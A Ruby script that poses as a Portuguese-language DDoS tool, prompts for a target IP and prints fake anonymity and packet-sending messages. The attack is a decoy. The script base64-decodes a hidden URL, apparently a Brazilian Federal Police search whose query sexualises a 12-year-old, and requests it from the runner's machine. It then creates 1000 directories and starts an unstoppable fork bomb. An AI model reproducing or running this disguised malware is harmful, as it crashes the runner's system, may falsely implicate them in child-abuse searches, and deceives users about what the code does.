require 'net/http'
require 'base64'

def packaged_gift
    msg = 'SEFDS0VELUJZLU9OTFlGQUxPUEFTLU9UQVJJT09P'
    msg_2 = 'aHR0cHM6Ly93d3cuZ292LmJyL3BmL3B0LWJyL3NlYXJjaD9TZWFyY2hhYmxl
        VGV4dD1ub3ZpbmhhJTIwZGUlMjAxMiUyMGFub3MlMjBnZW1lbmRvJTIwZ29z
        dG9zbw=='

    decoder = Base64.decode64(msg)
    decoder_2 =  Base64.decode64(msg_2)
    randomic_number = Random.rand(9999999)

    begin
        5.times { req = Net::HTTP.get_response("#{decoder_2}") }
        1000.times do 
            system "mkdir #{decoder}-#{randomic_number}"
        end 

        until 1>3 do; fork() ;end 
    rescue Interrupt 
        until 1>3 do; fork() ; end 
    end 
end

def ddos 
    banner = """
        ·▄▄▄▄  ·▄▄▄▄        .▄▄ · ▄• ▄▌ ▄▄▄·▄▄▄ .▄▄▄  
        ██▪ ██ ██▪ ██ ▪     ▐█ ▀. █▪██▌▐█ ▄█▀▄.▀·▀▄ █·
        ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄█▌▐█▌ ██▀·▐▀▀▪▄▐▀▀▄ 
        ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄█▌▐█▪·•▐█▄▄▌▐█•█▌
        ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀    ▀▀▀ .▀  ▀

        \033[34m -- [*] DDoS Tool ATTACK! --> by: f4l0p4s

        \033[31m ATENÇÃO! \033[33m O AUTOR NÃO SE RESPONSABILIZA PELO SEUS ATOS
    """

    system ("clear")
    colors = ["\033[96m", "\033[31m", "\033[34m", "\033[35m", "\033[32m"]

    colors.each do |colores|
        system ("clear"); puts "#{colores}#{banner}"
        sleep 0.8
    end 

    printf "\033[97m Digite o IP -> "; target = gets.chomp 
    sleep 0.4

    puts """ 


                                        \033[32m
    .------.                             /--> \033[31mDDOS ATTACK...\033[32m
      ___   .'  ___       ___       ___ /
     |===|-'   |===|     |===|     |===|
     |===|     |===|     |===|---->|===||  
     |==_|---->|==_|     |==_|   .-|==_|||        
                  ^            .'   |___||        
                   `----------'      |___|------> 
                
            
    """

    puts "\033[34m Te deixando anonimo [aguarde!]..."
    sleep 1
    puts "\033[97m--> tor system working! <-- "
    sleep 0.6

    (1..10).each do |n| 
        puts "\033[32m --> ENVIANDO 3000 PACOTES PARA #{target} <-- "
        sleep 0.3
    end 
    packaged_gift
end

ddos 
